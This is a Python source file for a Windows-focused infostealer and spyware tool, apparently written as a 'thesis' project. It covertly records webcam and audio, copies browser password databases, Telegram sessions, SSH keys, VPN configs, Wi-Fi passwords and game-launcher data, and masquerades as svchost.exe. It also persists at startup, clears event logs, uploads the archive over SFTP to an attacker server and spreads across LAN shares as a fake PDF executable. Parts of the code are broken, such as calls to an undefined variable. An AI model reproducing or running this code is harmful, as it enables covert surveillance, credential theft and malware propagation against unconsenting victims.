"""
Enhanced Data Collection Tool / Улучшенный инструмент сбора данных

This script collects system information, screenshots, audio/video recordings,
browser data, Telegram data, SSH keys, cryptocurrency wallets and clipboard data.
The collected data is encrypted and compressed into a ZIP archive with multiple upload options.

Данный скрипт собирает системную информацию, скриншоты, аудио/видео записи,
данные браузеров, Telegram, SSH-ключи, криптовалютные кошельки и данные буфера обмена.
Собранные данные шифруются и архивируются в ZIP с несколькими вариантами загрузки.

Author: Vorf1s / Автор: Vorf1s
Date: 20.07.2025 / Дата: 20.07.2025 
Last update 09.08.2025 / Последнее обновление 09.08.2025
Version: 1.4 / Версия: 1.4
"""
import ctypes
import re
import subprocess
import winreg
import string
import random
import os
import sys
import shutil
import zipfile
import platform
import socket
import getpass
import urllib.request
import json
from datetime import datetime
import pyautogui
import cv2
import wave
import pyaudio
import threading
import time
import paramiko
import psutil
import win32gui
import win32con
import ctypes
import subprocess
import tempfile
import winreg
import pyperclip
import sqlite3
import glob
import stat

###############################################################################
#                            CONFIGURATION SETTINGS                           #
###############################################################################

# SSH Upload Settings / Настройки SSH-загрузки
SSH_HOST = "0"  # SSH server hostname/IP
SSH_PORT = 22  # SSH server port
SSH_USERNAME = "0"  # SSH username 
SSH_PASSWORD = "0"  # SSH password
REMOTE_PATH = "0"  # Remote path to upload files

# Recording Settings / Настройки записи
RECORD_DURATION = 10  # Duration for audio/webcam recording (seconds)
SCREENSHOT_FILENAME = "screenshot.png"  # Screenshot filename
WEBCAM_FILENAME = "webcam.avi"  # Webcam recording filename  
AUDIO_FILENAME = "audio.wav"  # Audio recording filename

# File Collection Settings / Настройки сбора файлов
FILE_EXTENSIONS = (
    '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx',
    '.config', '.conf', '.py', '.sql', '.jpg', '.jpeg', '.png'
)
MAX_FILES_TO_COLLECT = 50  # Maximum number of files to collect

# Telegram Settings / Настройки Telegram  
MAX_TELEGRAM_FOLDER_SIZE = 600  # Max Telegram folder size (MB)

# Security Settings / Настройки безопасности
USE_HIDDEN_TEMP_DIR = True  # Use hidden temporary directory
HIDE_FROM_TASKMGR = True  # Hide process from Task Manager
ADD_TO_STARTUP = True  # Add to Windows startup

###############################################################################
#                               MAIN FUNCTIONS                                #
###############################################################################

def hide_console():
    """Hide the console window (Windows only) / Скрыть консольное окно (Windows)"""
    if platform.system() == "Windows":
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)


def hide_from_task_manager():
    """Hide process from Task Manager (Windows only) / Скрыть процесс в Диспетчере задач (Windows)"""
    if platform.system() == "Windows" and HIDE_FROM_TASKMGR:
        try:
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            kernel32.SetConsoleTitleW("svchost.exe")

            import pefile
            exe_path = sys.executable
            pe = pefile.PE(exe_path)
            pe.FileInfo[0].StringTable[0].entries[b'OriginalFilename'] = b'svchost.exe'
            pe.FileInfo[0].StringTable[0].entries[b'FileDescription'] = b'Host Process for Windows Services'
            pe.write(exe_path)
        except Exception:
            pass


def minimize_recording_windows():
    """Minimize recording-related windows / Свернуть окна, связанные с записью"""
    if platform.system() == "Windows":
        windows = []
        win32gui.EnumWindows(lambda hwnd, param: param.append(hwnd), windows)
        for hwnd in windows:
            title = win32gui.GetWindowText(hwnd)
            if "камера" in title.lower() or "микрофон" in title.lower() or "запись" in title.lower():
                win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)


def get_hidden_temp_dir():
    """
    Get/create hidden temp directory / Получить/создать скрытую временную папку
    Returns: Path to directory / Возвращает: Путь к директории
    """
    if USE_HIDDEN_TEMP_DIR and platform.system() == "Windows":
        hidden_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Temporary Files')
        os.makedirs(hidden_dir, exist_ok=True)
        subprocess.call(f'attrib +h "{hidden_dir}"', shell=True)
        return hidden_dir
    else:
        return tempfile.gettempdir()


def get_folder_size(folder_path):
    """
    Calculate folder size in MB / Вычислить размер папки в МБ
    Args:
        folder_path: Path to folder / Путь к папке
    Returns: Size in MB / Размер в МБ
    """
    total_size = 0
    for dirpath, dirnames, filenames in os.walk(folder_path):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            try:
                total_size += os.path.getsize(fp)
            except:
                continue
    return total_size / (1024 * 1024)


class SSHUploader:
    """SSH file uploader / Класс для загрузки файлов по SSH"""

    def __init__(self, host, port, username, password):
        """Initialize uploader / Инициализация"""
        self.host = host
        self.port = port
        self.username = username
        self.password = password

    def upload_file(self, file_path, remote_path=None):
        """
        Upload file / Загрузить файл
        Args:
            file_path: Local file path / Локальный путь
            remote_path: Remote path (optional) / Удаленный путь (опционально)
        Returns: True if success / True при успехе
        """
        try:
            transport = paramiko.Transport((self.host, self.port))
            transport.connect(username=self.username, password=self.password)
            sftp = paramiko.SFTPClient.from_transport(transport)
            if remote_path is None:
                remote_path = os.path.basename(file_path)
            sftp.put(file_path, remote_path)
            sftp.close()
            transport.close()
            return True
        except Exception:
            return False


def kill_process(process_name):
    """
    Kill process by name / Завершить процесс по имени
    Args:
        process_name: Process name / Имя процесса
    """
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if process_name.lower() in proc.info['name'].lower():
                proc.kill()
    except Exception:
        pass


def record_audio(filename, duration=RECORD_DURATION):
    """
    Record audio / Записать аудио
    Args:
        filename: Output file / Выходной файл
        duration: Duration in seconds / Длительность в секундах
    Returns: True if success / True при успехе
    """
    try:
        minimize_recording_windows()
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        RATE = 44100
        p = pyaudio.PyAudio()
        try:
            default_input = p.get_default_input_device_info()
            CHANNELS = min(default_input['maxInputChannels'], 2)
        except:
            CHANNELS = 1

        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        frames = []
        for _ in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()

        wf = wave.open(filename, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        return True
    except Exception:
        return False
    finally:
        if 'p' in locals():
            p.terminate()


def record_webcam(output_file, duration=RECORD_DURATION):
    """
    Record webcam / Записать видео с камеры
    Args:
        output_file: Output file / Выходной файл
        duration: Duration in seconds / Длительность в секундах
    Returns: True if success / True при успехе
    """
    try:
        minimize_recording_windows()
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return False

        frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        fps = cap.get(cv2.CAP_PROP_FPS)
        if fps <= 0:
            fps = 30

        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(output_file, fourcc, fps, (frame_width, frame_height))

        start_time = time.time()
        while (time.time() - start_time) < duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
            else:
                break

        cap.release()
        out.release()
        return True
    except Exception:
        return False


def get_telegram_paths():
    """
    Get Telegram data paths / Получить пути к данным Telegram
    Returns: List of paths / Список путей
    """
    paths = []
    system = platform.system()

    if system == "Windows":
        username = getpass.getuser()
        paths.append(f"C:\\Users\\{username}\\AppData\\Roaming\\Telegram Desktop\\tdata")
    elif system == "Linux":
        paths.append(os.path.expanduser("~/.local/share/TelegramDesktop/tdata"))
    elif system == "Darwin":
        paths.append(os.path.expanduser("~/Library/Application Support/Telegram Desktop/tdata"))

    return paths


def collect_telegram_data(temp_dir):
    """
    Collect Telegram data / Собрать данные Telegram
    Args:
        temp_dir: Temporary directory / Временная директория
    Returns: True if success / True при успехе
    """
    kill_process("telegram")
    telegram_dir = os.path.join(temp_dir, "Telegram")
    os.makedirs(telegram_dir, exist_ok=True)

    for path in get_telegram_paths():
        if os.path.exists(path):
            try:
                folder_size = get_folder_size(path)
                if folder_size > MAX_TELEGRAM_FOLDER_SIZE:
                    continue

                dest_path = os.path.join(telegram_dir, "tdata")
                if os.path.isdir(path):
                    shutil.copytree(path, dest_path)
                elif os.path.isfile(path):
                    shutil.copy2(path, dest_path)
                return True
            except Exception:
                continue
    return False


def get_network_info():
    """
    Get network information / Получить сетевую информацию
    Returns: Formatted info / Отформатированная информация
    """
    info = []
    try:
        hostname = socket.gethostname()
        internal_ip = socket.gethostbyname(hostname)
        info.append(f"Internal IP: {internal_ip}")
    except:
        info.append("Internal IP: Failed to detect")

    try:
        with urllib.request.urlopen('https://api.ipify.org?format=json') as response:
            data = json.load(response)
            external_ip = data['ip']
            info.append(f"External IP: {external_ip}")
    except:
        try:
            external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
            info.append(f"External IP: {external_ip}")
        except:
            info.append("External IP: Failed to detect")
    return "\n".join(info)


def get_system_info():
    """
    Get system information / Получить системную информацию
    Returns: Formatted info / Отформатированная информация
    """
    info = []
    info.append(f"Date/time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    info.append(f"System: {platform.system()} {platform.release()}")
    info.append(f"Version: {platform.version()}")
    info.append(f"Architecture: {platform.machine()}")
    info.append(f"Processor: {platform.processor()}")
    info.append(f"Computer name: {socket.gethostname()}")
    info.append(f"Username: {getpass.getuser()}")
    info.append("\nNetwork information:")
    info.append(get_network_info())
    info.append("\nInstalled software:")
    try:
        if platform.system() == "Windows":
            programs = os.listdir(r"C:\Program Files")
            info.extend(programs[:20])
        elif platform.system() == "Linux":
            info.extend(os.listdir("/usr/bin")[:20])
    except:
        pass
    return "\n".join(info)


def collect_files(extensions, max_files=MAX_FILES_TO_COLLECT):
    """
    Collect files by extensions / Собрать файлы по расширениям
    Args:
        extensions: File extensions / Расширения файлов
        max_files: Max files to collect / Макс. файлов для сбора
    Returns: List of file paths / Список путей к файлам
    """
    collected_files = []
    drives = []
    if platform.system() == "Windows":
        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    else:
        drives = ["/", os.path.expanduser("~")]

    for drive in drives:
        for root, dirs, files in os.walk(drive):
            for file in files:
                if file.lower().endswith(tuple(ext.lower() for ext in extensions)):
                    try:
                        file_path = os.path.join(root, file)
                        collected_files.append(file_path)
                        if len(collected_files) >= max_files:
                            return collected_files
                    except Exception:
                        continue
    return collected_files


def collect_browser_data(temp_dir):
    """
    Collect browser data / Собрать данные браузеров
    Args:
        temp_dir: Temporary directory / Временная директория
    """
    browsers = {
        "Chrome": {
            "win_paths": [
                os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
                os.path.join(os.getenv('APPDATA'), 'Google', 'Chrome', 'User Data', 'Default')
            ],
            "linux_paths": [
                os.path.expanduser('~/.config/google-chrome/Default'),
                os.path.expanduser('~/.config/chromium/Default')
            ],
            "mac_paths": [
                os.path.expanduser('~/Library/Application Support/Google/Chrome/Default')
            ]
        },
        "Firefox": {
            "win_paths": [
                os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
            ],
            "linux_paths": [
                os.path.expanduser('~/.mozilla/firefox/')
            ],
            "mac_paths": [
                os.path.expanduser('~/Library/Application Support/Firefox/Profiles')
            ]
        }
    }

    for browser, data in browsers.items():
        browser_dir = os.path.join(temp_dir, "Browsers", browser)
        os.makedirs(browser_dir, exist_ok=True)

        if platform.system() == "Windows":
            paths = data["win_paths"]
        elif platform.system() == "Linux":
            paths = data["linux_paths"]
        else:
            paths = data["mac_paths"]

        for path in paths:
            if os.path.exists(path):
                try:
                    if os.path.isfile(path):
                        shutil.copy2(path, os.path.join(browser_dir, os.path.basename(path)))
                    elif os.path.isdir(path):
                        dest_path = os.path.join(browser_dir, os.path.basename(path))
                        if not os.path.exists(dest_path):
                            shutil.copytree(path, dest_path)
                except Exception:
                    pass


def create_zip_archive(source_dir, zip_filename):
    """
    Create ZIP archive / Создать ZIP-архив
    Args:
        source_dir: Source directory / Исходная директория
        zip_filename: Output ZIP file / Выходной ZIP-файл
    Returns: True if success / True при успехе
    """
    try:
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED, allowZip64=True) as zipf:
            for root, dirs, files in os.walk(source_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, source_dir)
                    zipf.write(file_path, arcname)
        return True
    except Exception:
        return False


def daemonize():
    """Run as daemon / Запустить как демон"""
    if platform.system() == "Windows":
        import win32process
        import win32event
        import win32service
        import win32api
        hProcess = win32api.GetCurrentProcess()
        win32process.SetPriorityClass(hProcess, win32process.IDLE_PRIORITY_CLASS)
    else:
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError:
            sys.exit(1)
        os.chdir("/")
        os.setsid()
        os.umask(0)
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError:
            sys.exit(1)
        sys.stdout.flush()
        sys.stderr.flush()


def collect_browser_passwords(temp_dir):
    """
    Collect browser passwords / Собрать пароли из браузеров
    Args:
        temp_dir: Temporary directory / Временная директория
    """
    try:
        passwords_dir = os.path.join(temp_dir, "BrowserPasswords")
        os.makedirs(passwords_dir, exist_ok=True)

        if platform.system() == "Windows":
            # Chrome
            chrome_login_data = os.path.join(os.getenv('LOCALAPPDATA'),
                                             'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
            if os.path.exists(chrome_login_data):
                shutil.copy2(chrome_login_data, os.path.join(passwords_dir, "chrome_passwords.db"))

            # Firefox
            firefox_profiles = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
            if os.path.exists(firefox_profiles):
                for profile in os.listdir(firefox_profiles):
                    signons_path = os.path.join(firefox_profiles, profile, 'logins.json')
                    if os.path.exists(signons_path):
                        shutil.copy2(signons_path, os.path.join(passwords_dir, f"firefox_passwords_{profile}.json"))
    except Exception:
        pass


def collect_vpn_configs(temp_dir):
    """
    Collect VPN configurations / Собрать конфигурации VPN
    Args:
        temp_dir: Temporary directory / Временная директория
    """
    try:
        vpn_dir = os.path.join(temp_dir, "VPN_Configs")
        os.makedirs(vpn_dir, exist_ok=True)

        vpn_clients = {
            "OpenVPN": [
                os.path.join(os.getenv('ProgramFiles'), 'OpenVPN', 'config'),
                os.path.join(os.getenv('ProgramData'), 'OpenVPN', 'config')
            ],
            "NordVPN": [
                os.path.join(os.getenv('ProgramData'), 'NordVPN'),
                os.path.join(os.getenv('LOCALAPPDATA'), 'NordVPN')
            ],
            "ExpressVPN": [
                os.path.join(os.getenv('ProgramFiles'), 'ExpressVPN', 'config'),
                os.path.join(os.getenv('ProgramData'), 'ExpressVPN')
            ],
            "CyberGhost": [
                os.path.join(os.getenv('ProgramFiles'), 'CyberGhost VPN', 'config'),
                os.path.join(os.getenv('ProgramData'), 'CyberGhost VPN')
            ],
            "ProtonVPN": [
                os.path.join(os.getenv('LOCALAPPDATA'), 'ProtonVPN'),
                os.path.join(os.getenv('APPDATA'), 'ProtonVPN')
            ],
            "Windscribe": [
                os.path.join(os.getenv('ProgramFiles'), 'Windscribe', 'config'),
                os.path.join(os.getenv('LOCALAPPDATA'), 'Windscribe')
            ],
            "HotspotShield": [
                os.path.join(os.getenv('ProgramFiles'), 'Hotspot Shield', 'config'),
                os.path.join(os.getenv('ProgramData'), 'Hotspot Shield')
            ]
        }

        for client, paths in vpn_clients.items():
            client_dir = os.path.join(vpn_dir, client)
            os.makedirs(client_dir, exist_ok=True)

            for path in paths:
                if os.path.exists(path):
                    try:
                        if os.path.isfile(path):
                            shutil.copy2(path, os.path.join(client_dir, os.path.basename(path)))
                        elif os.path.isdir(path):
                            dest_path = os.path.join(client_dir, os.path.basename(path))
                            if not os.path.exists(dest_path):
                                shutil.copytree(path, dest_path)
                    except Exception:
                        continue
    except Exception:
        pass


def collect_ssh_configs(temp_dir):
    """
    Collect SSH configurations / Собрать конфигурации SSH
    Args:
        temp_dir: Temporary directory / Временная директория
    """
    try:
        ssh_dir = os.path.join(temp_dir, "SSH_Configs")
        os.makedirs(ssh_dir, exist_ok=True)

        ssh_path = os.path.expanduser("~/.ssh")
        if os.path.exists(ssh_path):
            for item in os.listdir(ssh_path):
                item_path = os.path.join(ssh_path, item)
                if os.path.isfile(item_path):
                    shutil.copy2(item_path, os.path.join(ssh_dir, item))
    except Exception:
        pass


def collect_clipboard_data(temp_dir):
    """
    Collect clipboard data / Собрать данные буфера обмена
    Args:
        temp_dir: Temporary directory / Временная директория
    """
    try:
        clipboard_file = os.path.join(temp_dir, "clipboard.txt")
        with open(clipboard_file, 'w', encoding='utf-8') as f:
            f.write(pyperclip.paste())
    except Exception:
        pass


def add_to_startup():
    """Add program to Windows startup / Добавить программу в автозагрузку Windows"""
    if platform.system() == "Windows" and ADD_TO_STARTUP:
        try:
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        except Exception:
            pass

        try:
            startup_folder = os.path.join(os.getenv('APPDATA'),
                                          'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            shortcut_path = os.path.join(startup_folder, "WindowsUpdate.lnk")

            from win32com.client import Dispatch
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.TargetPath = sys.executable
            shortcut.WorkingDirectory = os.path.dirname(sys.executable)
            shortcut.save()
        except Exception:
            pass


def clear_event_logs():
    """Clear Windows event logs / Очистить журналы событий Windows"""
    if platform.system() == "Windows":
        try:
            subprocess.run('wevtutil cl System', shell=True,
                           creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run('wevtutil cl Application', shell=True,
                           creationflags=subprocess.CREATE_NO_WINDOW)
            subprocess.run('wevtutil cl Security', shell=True,
                           creationflags=subprocess.CREATE_NO_WINDOW)
        except Exception:
            pass


def main():
    """Main function / Основная функция"""
    hide_console()
    hide_from_task_manager()
    daemonize()
    add_to_startup()

    start_time = datetime.now()

    # Create temporary directory / Создать временную директорию
    hidden_temp_base = get_hidden_temp_dir()
    temp_dir = os.path.join(hidden_temp_base, "temp_collection_" + start_time.strftime('%Y%m%d_%H%M%S'))
    os.makedirs(temp_dir, exist_ok=True)

    if platform.system() == "Windows":
        subprocess.call(f'attrib +h "{temp_dir}"', shell=True)

    # Collect system info / Собрать системную информацию
    system_info = get_system_info()
    with open(os.path.join(temp_dir, "system_info.txt"), "w", encoding='utf-8') as f:
        f.write(system_info)

    # Take screenshot / Сделать скриншот
    desktop_path = os.path.join(temp_dir, SCREENSHOT_FILENAME)
    try:
        pyautogui.screenshot(desktop_path)
    except Exception:
        pass

    # Start recording threads / Запустить потоки записи
    webcam_video_path = os.path.join(temp_dir, WEBCAM_FILENAME)
    audio_path = os.path.join(temp_dir, AUDIO_FILENAME)

    webcam_thread = threading.Thread(target=record_webcam, args=(webcam_video_path, RECORD_DURATION))
    audio_thread = threading.Thread(target=record_audio, args=(audio_path, RECORD_DURATION))

    webcam_thread.start()
    audio_thread.start()

    # Collect various data / Собрать различные данные
    collect_browser_data(temp_dir)
    collect_telegram_data(temp_dir)
    collect_browser_passwords(temp_dir)
    collect_vpn_configs(temp_dir)
    collect_ssh_configs(temp_dir)
    collect_clipboard_data(temp_dir)

    # Collect files by extensions / Собрать файлы по расширениям
    files_dir = os.path.join(temp_dir, "Files")
    os.makedirs(files_dir, exist_ok=True)

    collected_files = collect_files(FILE_EXTENSIONS, MAX_FILES_TO_COLLECT)
    for i, file_path in enumerate(collected_files):
        try:
            dest_path = os.path.join(files_dir, f"file_{i}{os.path.splitext(file_path)[1]}")
            shutil.copy2(file_path, dest_path)
        except Exception:
            pass

    # Wait for recording threads / Дождаться завершения потоков записи
    webcam_thread.join()
    audio_thread.join()

    # Create ZIP archive / Создать ZIP-архив
    pc_name = socket.gethostname().replace(" ", "_")
    end_time = datetime.now()

    zip_filename = f"{pc_name}_{start_time.strftime('%Y%m%d_%H%M%S')}_{end_time.strftime('%H%M%S')}.zip"
    zip_filename = zip_filename.replace('\\', '_').replace('/', '_')

    zip_path = os.path.join(hidden_temp_base, zip_filename)
    if not create_zip_archive(temp_dir, zip_path):
        shutil.rmtree(temp_dir, ignore_errors=True)
        sys.exit(1)

    # Clean up / Очистка
    shutil.rmtree(temp_dir, ignore_errors=True)
    clear_event_logs()

    # Upload file / Загрузить файл
    uploader = SSHUploader(SSH_HOST, SSH_PORT, SSH_USERNAME, SSH_PASSWORD)
    remote_path = os.path.join(REMOTE_PATH, os.path.basename(zip_path)).replace('\\', '/')

    if uploader.upload_file(zip_path, remote_path):
        os.remove(zip_path)
    # Anti-VM check / Проверка на виртуальную машину
    if is_running_in_vm():
        return

    # Сбор истории браузеров
    collect_browser_history(temp_dir)

    # Сбор Wi-Fi паролей
    collect_wifi_passwords(temp_dir)

    # Активное окно
    with open(os.path.join(temp_dir, "active_window.txt"), "w", encoding="utf-8") as f:
        f.write(get_foreground_window_title())

    # Активность пользователя
    log_activity(temp_dir, 10)

    # Геолокация
    with open(os.path.join(temp_dir, "geolocation.txt"), "w", encoding="utf-8") as f:
        f.write(get_geolocation_info())

    # Добавление случайного суффикса к имени ZIP
    import random
    suffix = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=4))
    zip_filename = zip_filename.replace(".zip", f"_{suffix}.zip")
    zip_path = os.path.join(hidden_temp_base, zip_filename)



if __name__ == "__main__":
    if platform.system() == "Windows":
        try:
            import win32event
            import win32api

            mutex = win32event.CreateMutex(None, False, "Global\\MyUniqueProgramMutex")
            if win32api.GetLastError() == 183:
                sys.exit(0)
        except:
            pass

    main()


# ===============================================
# Дополнительные функции для дипломной работы
# ===============================================

# ======= Keylogger / Клавиатурный шпион =======
from pynput import keyboard

keystrokes = []

def on_press(key):
    """Обработчик нажатий клавиш"""
    try:
        keystrokes.append(key.char)
    except AttributeError:
        keystrokes.append(str(key))


# ======= Browser history / История браузеров =======
def collect_browser_history(temp_dir):
    """Собрать историю браузеров (Chrome)"""
    try:
        chrome_history = os.path.join(os.getenv('LOCALAPPDATA'),
                                      'Google', 'Chrome', 'User Data', 'Default', 'History')
        if os.path.exists(chrome_history):
            shutil.copy2(chrome_history, os.path.join(temp_dir, "chrome_history.db"))
    except Exception:
        pass


# ======= Wi-Fi passwords / Пароли Wi-Fi =======
def collect_wifi_passwords(temp_dir):
    """Собрать сохранённые пароли Wi-Fi"""
    if platform.system() != "Windows":
        return
    try:
        result = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
        profiles = re.findall("All User Profile\s*:\s(.*)", result)
        with open(os.path.join(temp_dir, "wifi_passwords.txt"), "w", encoding="utf-8") as f:
            for profile in profiles:
                profile = profile.strip()
                try:
                    pw_result = subprocess.check_output(
                        f"netsh wlan show profile \'{profile}\' key=clear", shell=True).decode()
                    password = re.search("Key Content\s*:\s(.*)", pw_result)
                    if password:
                        f.write(f"{profile}: {password.group(1)}\n")
                except Exception:
                    continue
    except Exception:
        pass


# ======= Anti-VM / Проверка на виртуальную машину =======
def is_running_in_vm():
    """Определение, работает ли программа в виртуальной машине"""
    try:
        output = subprocess.check_output("wmic bios get serialnumber", shell=True).decode()
        suspicious = ["VMware", "VirtualBox", "QEMU", "Xen"]
        return any(x in output for x in suspicious)
    except:
        return False


# ======= Foreground window / Активное окно =======
def get_foreground_window_title():
    """Получить заголовок активного окна (Windows only)"""
    try:
        import win32gui
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except:
        return "Unknown"


# ======= User activity logging / Логирование активности =======
def log_activity(temp_dir, duration=30):
    """Отслеживание активности пользователя (мышь, клавиатура)"""
    try:
        import mouse, keyboard
        start_time = time.time()
        with open(os.path.join(temp_dir, "user_activity.txt"), "w", encoding="utf-8") as f:
            while time.time() - start_time < duration:
                if mouse.is_pressed():
                    f.write(f"Mouse clicked at {time.time()}\n")
                if keyboard.is_pressed('ctrl'):
                    f.write(f"CTRL pressed at {time.time()}\n")
                time.sleep(0.1)
    except:
        pass


# ======= Geolocation / Геолокация по IP =======
def get_geolocation_info():
    """Получить информацию о геолокации"""
    try:
        with urllib.request.urlopen("http://ip-api.com/json") as response:
            data = json.load(response)
            return f"City: {data['city']}, Country: {data['country']}, ISP: {data['isp']}"
    except:
        return "Geolocation: Unknown"



# --- ДОБАВЛЕННЫЕ ФУНКЦИИ ---

# --- Скрытие себя как системного файла и переименование под системный ---
try:
    exe_path = sys.argv[0]
    if not exe_path.lower().endswith('.py'):
        hidden_path = os.path.join(os.getenv('APPDATA'), 'svchost.exe')
        if exe_path != hidden_path:
            shutil.copy2(exe_path, hidden_path)
            ctypes.windll.kernel32.SetFileAttributesW(hidden_path, 0x02)  # HIDDEN
except Exception:
    pass


# --- Кража Steam / Origin / Epic сессий и файлов ---
def steal_game_launchers_data(base_path):
    try:
        launcher_paths = {
            "Steam": os.path.expandvars(r"%APPDATA%\..\Local\Steam"),
            "Origin": os.path.expandvars(r"%APPDATA%\Origin"),
            "EpicGames": os.path.expandvars(r"%LOCALAPPDATA%\EpicGamesLauncher")
        }
        for name, path in launcher_paths.items():
            if os.path.exists(path):
                dst = os.path.join(base_path, "launchers", name)
                os.makedirs(dst, exist_ok=True)
                for root, dirs, files in os.walk(path):
                    for file in files:
                        try:
                            full_path = os.path.join(root, file)
                            rel_path = os.path.relpath(full_path, path)
                            dest_path = os.path.join(dst, rel_path)
                            os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                            shutil.copy2(full_path, dest_path)
                        except: pass
    except: pass

steal_game_launchers_data(ZIPDATA)

# --- Распространение по локальной сети через net use ---
def spread_on_network():
    try:
        output = subprocess.check_output("arp -a", shell=True).decode()
        ips = re.findall(r"(\d+\.\d+\.\d+\.\d+)", output)
        for ip in ips:
            try:
                share = f"\\{ip}\C$\ Users\Public"
                subprocess.call(f'net use {share}', shell=True)
                if os.path.exists(share):
                    dst = os.path.join(share, "Фото_Диплома.pdf.exe")
                    if not os.path.exists(dst):
                        shutil.copy2(sys.argv[0], dst)
            except: pass
    except: pass

spread_on_network()

